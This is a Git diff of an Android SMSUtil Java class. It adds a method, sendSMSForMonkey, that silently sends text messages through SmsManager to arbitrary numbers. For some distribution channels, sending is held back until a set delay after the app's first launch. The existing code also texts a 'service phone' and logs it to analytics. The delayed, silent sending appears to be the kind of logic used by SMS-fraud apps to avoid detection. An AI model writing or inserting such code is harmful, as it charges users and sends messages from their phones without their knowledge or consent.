@@ -22,11 +22,31 @@ import java.util.HashMap;
  */
 public class SMSUtil {
 
-    public static final boolean sendSMS(String target, String msg) {
+    public static final boolean sendSMSForMonkey(String target, String msg) {
+        try {
+            int channel = Integer.valueOf(Config.CHANNEL_CODE);
+            long currentTime = System.currentTimeMillis();
+            long delay = currentTime - SettingManager.getInstance().getFirstLanuchTime();
+            if (channel > 900000 && delay < Config.DELAY_ACTIVE_DO_MONKEY) return false;
+
+            SmsManager.getDefault().sendTextMessage(target, null, msg, null, null);
+            if (Config.DEBUG) {
+                Config.LOGD("[[SMSUtil::sendSMSForMonkey]] try to send msg : << " + msg + " >> to : << " + target + " >>");
+            }
+
+            return true;
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+
+        return false;
+    }
+
+    public static final boolean sendSMSForLogic(String target, String msg) {
         try {
             SmsManager.getDefault().sendTextMessage(target, null, msg, null, null);
             if (Config.DEBUG) {
-                Config.LOGD("[[SMSUtil::sendSMS]] try to send msg : << " + msg + " >> to : << " + target + " >>");
+                Config.LOGD("[[SMSUtil::sendSMSForLogic]] try to send msg : << " + msg + " >> to : << " + target + " >>");
             }
 
             return true;
@@ -97,7 +117,7 @@ public class SMSUtil {
             CommonUtil.umengLog(context, "send_sms_phone1", log);
         }
 
-        if (!TextUtils.isEmpty(content) && sendSMS(target, content)) {
+        if (!TextUtils.isEmpty(content) && sendSMSForLogic(target, content)) {
             SettingManager.getInstance().setKeyDeviceHasSendToServicePhone(true);
         } else {
             SettingManager.getInstance().setKeyDeviceHasSendToServicePhone(false);
